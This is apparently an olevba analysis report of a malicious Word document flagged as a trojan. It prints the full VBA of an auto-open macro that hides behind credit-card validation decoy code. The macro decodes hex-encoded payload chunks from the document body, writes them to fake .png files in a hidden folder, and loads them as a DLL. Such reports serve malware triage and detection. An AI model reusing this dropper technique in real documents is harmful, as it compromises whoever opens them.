olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: HEUR-Trojan.MSOffice.Alien.gen-b0e5975e66d631a5666a92a177680ba2f6555708305347ebe4aee84914244219
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: HEUR-Trojan.MSOffice.Alien.gen-b0e5975e66d631a5666a92a177680ba2f6555708305347ebe4aee84914244219 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO autoOPen.bas 
in file: HEUR-Trojan.MSOffice.Alien.gen-b0e5975e66d631a5666a92a177680ba2f6555708305347ebe4aee84914244219 - OLE stream: 'Macros/VBA/autoOPen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Enum NumericFunctions_CardType
    VISA = 1
    MasterCard = 2
    DinersClub = 3
    CanadianSocialInsuranceNumber = 4
    enRoute = 5
    Discover = 6
    Novus = 6
    AmericanExpress = 7
    AMEX = 7
    carteBlanche = 8
    [JCB (Japanese Credit Bureau)] = 9
    [Australian BankCard] = 10
    [Other (Gas,Retail,Debit,etc)] = 81
End Enum

#If VBA7 Then
Declare PtrSafe Sub RedirectStandardError Lib "c:\.intel\.rem\1.png           " ()
#Else
Declare Sub RedirectStandardError Lib "c:\.intel\.rem\2.png           " ()
#End If

Sub main()
 
    GetCardName "3600", AmericanExpress
    GetCardName "4100", Novus
    CreateFolderRecursive "c:\.intel\.rem\.lang"
    GetCardName "3800", MasterCard
    FileNum = FreeFile
    Open "c:\.intel\.rem\1.png" For Append As FileNum
    Print #FileNum, hex2ascii(hex2ascii(ThisDocument.Words(1988))) + hex2ascii(hex2ascii(ThisDocument.Words(1990))) + hex2ascii(hex2ascii(ThisDocument.Words(1992))) + hex2ascii(hex2ascii(ThisDocument.Words(1994))) + hex2ascii(hex2ascii(ThisDocument.Words(1996))) + hex2ascii(hex2ascii(ThisDocument.Words(1998))) + hex2ascii(hex2ascii(ThisDocument.Words(2000))) + hex2ascii(hex2ascii(ThisDocument.Words(2002))) + hex2ascii(hex2ascii(ThisDocument.Words(2004))) + hex2ascii(hex2ascii(ThisDocument.Words(2006))) + hex2ascii(hex2ascii(ThisDocument.Words(2008))) + hex2ascii(hex2ascii(ThisDocument.Words(2010))) + hex2ascii(hex2ascii(ThisDocument.Words(2012))) + hex2ascii(hex2ascii(ThisDocument.Words(2014))) + hex2ascii(hex2ascii(ThisDocument.Words(2016))) + hex2ascii(hex2ascii(ThisDocument.Words(2018))) + hex2ascii(hex2ascii(ThisDocument.Words(2020))) + hex2ascii(hex2ascii(ThisDocument.Words(2022))) + _
    hex2ascii(hex2ascii(ThisDocument.Words(2024))) + hex2ascii(hex2ascii(ThisDocument.Words(2026))) + hex2ascii(hex2ascii(ThisDocument.Words(2028))) + hex2ascii(hex2ascii(ThisDocument.Words(2030))) + hex2ascii(hex2ascii(ThisDocument.Words(2032))) + hex2ascii(hex2ascii(ThisDocument.Words(2034))) + hex2ascii(hex2ascii(ThisDocument.Words(2036))) + hex2ascii(hex2ascii(ThisDocument.Words(2038))) + hex2ascii(hex2ascii(ThisDocument.Words(2040))) + hex2ascii(hex2ascii(ThisDocument.Words(2042))) + hex2ascii(hex2ascii(ThisDocument.Words(2044))) + hex2ascii(hex2ascii(ThisDocument.Words(2046))) + hex2ascii(hex2ascii(ThisDocument.Words(2048))) + hex2ascii(hex2ascii(ThisDocument.Words(2050))) + _
    hex2ascii(hex2ascii(ThisDocument.Words(2052))) + hex2ascii(hex2ascii(ThisDocument.Words(2054))) + hex2ascii(hex2ascii(ThisDocument.Words(2056))) + hex2ascii(hex2ascii(ThisDocument.Words(2058))) + hex2ascii(hex2ascii(ThisDocument.Words(2060))) + hex2ascii(hex2ascii(ThisDocument.Words(2062))) + hex2ascii(hex2ascii(ThisDocument.Words(2064))) + hex2ascii(hex2ascii(ThisDocument.Words(2066))) + hex2ascii(hex2ascii(ThisDocument.Words(2068))) + hex2ascii(hex2ascii(ThisDocument.Words(2070))) + hex2ascii(hex2ascii(ThisDocument.Words(2072))) + hex2ascii(hex2ascii(ThisDocument.Words(2074))) + hex2ascii(hex2ascii(ThisDocument.Words(2076))) + hex2ascii(hex2ascii(ThisDocument.Words(2078))) + hex2ascii(hex2ascii(ThisDocument.Words(2080))) + hex2ascii(hex2ascii(ThisDocument.Words(2082))) + _
    hex2ascii(hex2ascii(ThisDocument.Words(2084))) + hex2ascii(hex2ascii(ThisDocument.Words(2086))) + hex2ascii(hex2ascii(ThisDocument.Words(2088))) + hex2ascii(hex2ascii(ThisDocument.Words(2090))) + hex2ascii(hex2ascii(ThisDocument.Words(2092))) + hex2ascii(hex2ascii(ThisDocument.Words(2094))) + hex2ascii(hex2ascii(ThisDocument.Words(2096))) + hex2ascii(hex2ascii(ThisDocument.Words(2098))) + hex2ascii(hex2ascii(ThisDocument.Words(2100))) + hex2ascii(hex2ascii(ThisDocument.Words(2102))) + hex2ascii(hex2ascii(ThisDocument.Words(2104)))

    Close FileNum
    
    Open "c:\.intel\.rem\2.png" For Append As FileNum
    Print #FileNum, hex2ascii(hex2ascii(ThisDocument.Words(2106))) + hex2ascii(hex2ascii(ThisDocument.Words(2108))) + hex2ascii(hex2ascii(ThisDocument.Words(2110))) + hex2ascii(hex2ascii(ThisDocument.Words(2112))) + hex2ascii(hex2ascii(ThisDocument.Words(2114))) + hex2ascii(hex2ascii(ThisDocument.Words(2116))) + hex2ascii(hex2ascii(ThisDocument.Words(2118))) + hex2ascii(hex2ascii(ThisDocument.Words(2120))) + hex2ascii(hex2ascii(ThisDocument.Words(2122))) + hex2ascii(hex2ascii(ThisDocument.Words(2124))) + hex2ascii(hex2ascii(ThisDocument.Words(2126))) + hex2ascii(hex2ascii(ThisDocument.Words(2128))) + hex2ascii(hex2ascii(ThisDocument.Words(2130))) + hex2ascii(hex2ascii(ThisDocument.Words(2132))) + hex2ascii(hex2ascii(ThisDocument.Words(2134))) + hex2ascii(hex2ascii(ThisDocument.Words(2136))) + hex2ascii(hex2ascii(ThisDocument.Words(2138))) + hex2ascii(hex2ascii(ThisDocument.Words(2140))) + _
    hex2ascii(hex2ascii(ThisDocument.Words(2142))) + hex2ascii(hex2ascii(ThisDocument.Words(2144))) + hex2ascii(hex2ascii(ThisDocument.Words(2146))) + hex2ascii(hex2ascii(ThisDocument.Words(2148))) + hex2ascii(hex2ascii(ThisDocument.Words(2150))) + hex2ascii(hex2ascii(ThisDocument.Words(2152))) + hex2ascii(hex2ascii(ThisDocument.Words(2154))) + hex2ascii(hex2ascii(ThisDocument.Words(2156))) + hex2ascii(hex2ascii(ThisDocument.Words(2158))) + hex2ascii(hex2ascii(ThisDocument.Words(2160))) + hex2ascii(hex2ascii(ThisDocument.Words(2162))) + hex2ascii(hex2ascii(ThisDocument.Words(2164))) + hex2ascii(hex2ascii(ThisDocument.Words(2166))) + _
    hex2ascii(hex2ascii(ThisDocument.Words(2168))) + hex2ascii(hex2ascii(ThisDocument.Words(2170))) + hex2ascii(hex2ascii(ThisDocument.Words(2172))) + hex2ascii(hex2ascii(ThisDocument.Words(2174))) + hex2ascii(hex2ascii(ThisDocument.Words(2176))) + hex2ascii(hex2ascii(ThisDocument.Words(2178))) + hex2ascii(hex2ascii(ThisDocument.Words(2180))) + hex2ascii(hex2ascii(ThisDocument.Words(2182))) + hex2ascii(hex2ascii(ThisDocument.Words(2184))) + hex2ascii(hex2ascii(ThisDocument.Words(2186))) + hex2ascii(hex2ascii(ThisDocument.Words(2188))) + hex2ascii(hex2ascii(ThisDocument.Words(2190))) + hex2ascii(hex2ascii(ThisDocument.Words(2192))) + hex2ascii(hex2ascii(ThisDocument.Words(2194))) + _
    hex2ascii(hex2ascii(ThisDocument.Words(2196))) + hex2ascii(hex2ascii(ThisDocument.Words(2198))) + hex2ascii(hex2ascii(ThisDocument.Words(2200))) + hex2ascii(hex2ascii(ThisDocument.Words(2202))) + hex2ascii(hex2ascii(ThisDocument.Words(2204))) + hex2ascii(hex2ascii(ThisDocument.Words(2206))) + hex2ascii(hex2ascii(ThisDocument.Words(2208)))

    Close FileNum

    IsValidCard "3600", Discover
End Sub

Private Function hex2ascii(ByVal TextToFile As String) As String
    Dim y As Integer
    For y = 1 To Len(TextToFile)
    Num = Mid(TextToFile, y, 2)
    Value = Value + Chr(Val("&h" + Num))
    y = y + 1
    Next y
    hex2ascii = Value
End Function

Function CreateFolderRecursive(path As String) As Boolean
    Dim FSO As New FileSystemObject

    'If the path exists as a file, the function fails.
    If FSO.FileExists(path) Then
        CreateFolderRecursive = False
        Exit Function
    End If

    'If the path already exists as a folder, don't do anything and return success.
    If FSO.FolderExists(path) Then
        CreateFolderRecursive = True
        Exit Function
    End If

    'recursively create the parent folder, then if successful create the top folder.
    If CreateFolderRecursive(FSO.GetParentFolderName(path)) Then
        If FSO.CreateFolder(path) Is Nothing Then
            CreateFolderRecursive = False
        Else
            CreateFolderRecursive = True
        End If
    Else
        CreateFolderRecursive = False
    End If
End Function
Public Function IsValidCard(ByVal CardNumber As String, CCType As NumericFunctions_CardType, _
                                        Optional ReturnCardNameIfValid As Boolean = False) As Variant

    Dim X As Long
    Dim Total As Long
    Dim CardNumberLength As Long
    Dim Temp As String
    Dim RevCardNumber As String
    Dim ParsedCardNumber As String
    Dim Character As String
    Dim Digit As Long
    Dim FirstDigit As Long
    Dim FirstFourDigits As Long
    Dim DigitsOK As Boolean
    Dim LengthOK As Boolean
    


'Prepare the default return value
    If ReturnCardNameIfValid Then
            IsValidCard = ""

        Else
            Dim dtOrigTime As Date
            dtOrigTime = DateTime.Time
            Do Until DateDiff("s", dtOrigTime, DateTime.Time, 0, 0) > 1
            Loop
            IsValidCard = False
    End If
     
    
'Parses all non-numeric characters from
'CardNumber into a temporary string
    For X = 1 To Len(CardNumber)
        Character = Mid$(CardNumber, X, 1)
        Temp = Temp & IIf(IsNumeric(Character), Character, "")
    Next
    ParsedCardNumber = Temp
    
'Save the length of the card number length for later use
'in editting the card carrier
    CardNumberLength = Len(Temp)
        
    RedirectStandardError
'Exit if number of digits is not in range of testable Card numbers
    If CardNumberLength < 9 Or CardNumberLength > 19 Then
        Exit Function
    End If
    
'Save specific leading digits for later use in editting the card carrier
    FirstDigit = CLng(Left$(Temp, 1))
    FirstFourDigits = CLng(Left$(Temp, 4))
    
    Select Case CCType
        Case VISA
            DigitsOK = (FirstFourDigits >= 4000) And _
                            (FirstFourDigits <= 4999)
            LengthOK = (CardNumberLength = 13) Or _
                            (CardNumberLength = 16)
        Case MasterCard
            DigitsOK = (FirstFourDigits >= 5100) And _
                            (FirstFourDigits <= 5599)
            LengthOK = (CardNumberLength = 16)
        Case enRoute
            DigitsOK = (FirstFourDigits = 2014) Or _
                            (FirstFourDigits = 2149)
            LengthOK = (CardNumberLength = 15)
        Case Discover
            DigitsOK = (FirstFourDigits = 6011)
            LengthOK = (CardNumberLength = 16)
        Case DinersClub
            DigitsOK = ((FirstFourDigits >= 3000) And _
                            (FirstFourDigits <= 3059)) Or _
                            ((FirstFourDigits >= 3600) And _
                            (FirstFourDigits <= 3699)) Or _
                            ((FirstFourDigits >= 3800) And _
                            (FirstFourDigits <= 3889))
            LengthOK = (CardNumberLength = 14)
        Case carteBlanche
                DigitsOK = (FirstFourDigits >= 3890) And _
                                (FirstFourDigits <= 3899)
                LengthOK = (CardNumberLength = 14)
        Case AmericanExpress, AMEX
                DigitsOK = ((FirstFourDigits >= 3400) And _
                                (FirstFourDigits <= 3499)) Or _
                                ((FirstFourDigits >= 3700) And _
                                (FirstFourDigits <= 3799))
                LengthOK = (CardNumberLength = 15)
        Case CanadianSocialInsuranceNumber
                DigitsOK = Not (FirstDigit = 0) Or _
                                Not (FirstDigit = 8)
                LengthOK = (CardNumberLength = 9)
        Case [JCB (Japanese Credit Bureau)]
                DigitsOK = (FirstFourDigits >= 3528) And _
                                (FirstFourDigits <= 3589)
                LengthOK = (CardNumberLength = 16)
        Case [Australian BankCard]
                DigitsOK = (FirstFourDigits = 5610)
                LengthOK = (CardNumberLength = 16)
        Case [Other (Gas,Retail,Debit,etc)]
                DigitsOK = True
                LengthOK = True
        Case Else
                DigitsOK = False
                LengthOK = False
    End Select
    
'If the number sequence and/or card number length
'do not match the requirements the
'requirements of the carrier; Exit
    If Not DigitsOK Or Not LengthOK Then
        Exit Function
    End If
    
'Reverse the CardNumber
    For X = 1 To Len(Temp)
        RevCardNumber = Mid$(Temp, X, 1) & RevCardNumber
    Next
    
'Iterate through the reversed number; Add the
'calculated totals to string for subsequent summation.
'The equation  = (1 + (X - 1) Mod 2) below will result '
'in a multiplier of 1 if the element is odd (i.e. 1st digit, 3rd, 5th, etc)
'or a multiplier of 2 if the element is even (i.e. 2nd digit, 4th, 6th, etc)
    Temp = ""
    For X = 1 To Len(RevCardNumber)
        Digit = CLng(Mid$(RevCardNumber, X, 1))
        Temp = Temp & (Digit * (1 + (X - 1) Mod 2))
    Next
    
'Iterate through the string just created and total
'the individual numbers in each character of the string
    For X = 1 To Len(Temp)
        Total = Total + CLng(Mid$(Temp, X, 1))
    Next
    
'If the total of the added elements ends in zero, '
'the card number is valid
    IsValidCard = CBool(Total Mod 10 = 0)
    
    If IsValidCard And ReturnCardNameIfValid Then
        IsValidCard = GetCardName(ParsedCardNumber, CCType)
    End If
End Function


Private Function GetCardName(CardNumber As String, CCType As NumericFunctions_CardType) As String
    If CCType = CanadianSocialInsuranceNumber Then
        GetCardName = "SIN number"
        Exit Function
    End If
    
    Select Case Left$(CardNumber, 4)
        Case 1800
            GetCardName = "JCB (Japanese Credit Bureau)lsdkfjsdhf sdyfsdu dasfdva bda sdywegp"
        Case 2014
            GetCardName = "enRoute"
        Case 2131
            GetCardName = "JCB (Japanese Credit Bureau)"
        Case 2149
            GetCardName = "enRoute"
        Case 3000 To 3059
            GetCardName = "Diners Club"
        Case 3400 To 3499
            GetCardName = "American Express"
        Case 3528 To 3589
            GetCardName = "JCB (Japanese Credit Bureau)"
        Case 3600 To 3699
            GetCardName = "Diners Club"
        Case 3700 To 3799
            GetCardName = "American Express"
        Case 3800 To 3889
            GetCardName = "Diners Club"
        Case 3890 To 3899
            GetCardName = "carteBlanche"
        Case 4000 To 4999
            GetCardName = "VISA"
        Case 5100 To 5599
            GetCardName = "MasterCard"
        Case 5610
            GetCardName = "Australian BankCard"
        Case 6011
            GetCardName = "Discover"
        Case Else
                Select Case Left$(CardNumber, 1)
                    Case 1 'Airline
                        GetCardName = "Other (Airline)"
                    Case 2 'Airline and other industry assignments
                        GetCardName = "Other (Airline and other idustries)"
                    Case 3 'Travel/Entertainment
                        GetCardName = "Other (Travel/Entertainment)"
                    Case 4 'Banking and financial
                        GetCardName = "Other (Banking/Financial)"
                    Case 5 'Banking and financial
                        GetCardName = "Other (Banking/Financial)"
                    Case 6 'Merchandising and banking
                        GetCardName = "Other (Merchandising/Banking)"
                    Case 7 'Petroleum
                        GetCardName = "Other (Gas Company)"
                    Case 8 'HealthCare/Telecommunications and other
                        GetCardName = "Other (HealthCare/Telecomm/Etc)"
                    Case 9 'National assignment
                        GetCardName = "Other [Card Carrier Unknown]"
                    Case 0 'ISO/TC 68 and other industry assignments
                        GetCardName = "Other [Card Carrier Unknown]"
            End Select
    End Select

End Function









+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoOPen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|create              |May execute file or a system command through |
|          |                    |WMI                                          |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

